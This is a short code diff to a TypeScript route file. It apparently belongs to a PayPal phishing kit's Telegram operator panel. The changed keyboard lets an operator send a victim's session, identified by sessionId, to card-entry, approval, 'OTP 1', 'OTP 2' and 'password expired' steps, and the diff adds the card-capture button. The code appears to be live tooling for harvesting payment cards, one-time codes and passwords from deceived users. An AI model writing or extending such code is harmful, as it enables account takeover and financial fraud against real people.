@@ -446,11 +446,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
         const keyboard = [
           [
-            { text: "✅ Approuver", callback_data: `paypal_approve_${clientInfo.sessionId}` },
-            { text: "🔑 OTP 1", callback_data: `paypal_otp1_${clientInfo.sessionId}` }
+            { text: "💳 Carte", callback_data: `paypal_card_${clientInfo.sessionId}` },
+            { text: "✅ Approuver", callback_data: `paypal_approve_${clientInfo.sessionId}` }
           ],
           [
-            { text: "🔑 OTP 2", callback_data: `paypal_otp2_${clientInfo.sessionId}` },
+            { text: "🔑 OTP 1", callback_data: `paypal_otp1_${clientInfo.sessionId}` },
+            { text: "🔑 OTP 2", callback_data: `paypal_otp2_${clientInfo.sessionId}` }
+          ],
+          [
             { text: "🔒 Mot de passe expiré", callback_data: `paypal_password_${clientInfo.sessionId}` }
           ],
           [
